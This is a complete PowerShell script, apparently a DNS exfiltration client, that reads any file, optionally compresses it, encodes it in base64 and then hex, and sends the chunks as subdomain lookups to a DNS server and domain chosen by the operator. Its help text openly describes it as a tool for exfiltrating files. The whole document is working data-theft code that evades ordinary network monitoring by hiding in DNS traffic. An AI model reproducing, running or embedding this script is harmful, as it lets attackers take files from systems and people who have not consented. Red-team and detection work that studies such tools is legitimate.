param (
    [string]$FilePath,
    [string]$Domain,
    [string]$DnsServerIp,
    [bool]$UseGzip
)

# Function to display help
function Show-Help {
    Write-Host "Usage: .\exfil_client.ps1 -FilePath <file_path> -Domain <domain> -DnsServerIp <dns_server_ip> -UseGzip <true/false>"
    Write-Host "Exfiltrates a file over DNS by sending base64 encoded chunks as DNS queries."
    Write-Host ""
    Write-Host "Parameters:"
    Write-Host "  -FilePath      Path to the file you want to exfiltrate."
    Write-Host "  -Domain        Domain to use in DNS queries."
    Write-Host "  -DnsServerIp   IP address of the DNS server."
    Write-Host "  -UseGzip       Set to 'true' to gzip the file before encoding; otherwise, set to 'false'."
    Write-Host ""
    Write-Host "Example:"
    Write-Host '  .\exfil_client.ps1 -FilePath "C:\path\to\your\file" -Domain "example.com" -DnsServerIp "8.8.8.8" -UseGzip $true'
}

# Check if all required parameters are provided
if (-not $FilePath -or -not $Domain -or -not $DnsServerIp -or -not (Test-Path $FilePath)) {
    Show-Help
    exit 1
}

$filename = [System.IO.Path]::GetFileName($FilePath)

# Read file content as bytes
$data = [System.IO.File]::ReadAllBytes($FilePath)

# Check if gzip compression is requested
if ($UseGzip) {
    # Compress data using gzip
    $compressedStream = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GZipStream $compressedStream, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write($data, 0, $data.Length)
    $gzipStream.Close()

    # Get compressed data as byte array
    $compressedData = $compressedStream.ToArray()

    # Convert compressed data to base64 string
    $base64_data = [Convert]::ToBase64String($compressedData)
} else {
    # Convert data to base64 string without gzip compression
    $base64_data = [Convert]::ToBase64String($data)
}

# Maximum chunk size for DNS label length
$max_chunk_length = 62

# Split base64 data into chunks and send DNS queries
for ($i = 0; $i -lt $base64_data.Length; $i += $max_chunk_length) {
    $chunk = $base64_data.Substring($i, [Math]::Min($max_chunk_length, $base64_data.Length - $i))
    $chunk_1 = $chunk.Substring(0, $chunk.Length / 2)
    $chunk_2 = $chunk.Substring($chunk.Length / 2)
    $hex_chunk_1 = -join ($chunk_1.ToCharArray() | ForEach-Object { "{0:X2}" -f [byte][char]$_ })
    $hex_chunk_2 = -join ($chunk_2.ToCharArray() | ForEach-Object { "{0:X2}" -f [byte][char]$_ })
    $subdomain = "$hex_chunk_1-.$hex_chunk_2-.$Domain."
    nslookup -type=a $subdomain $DnsServerIp
}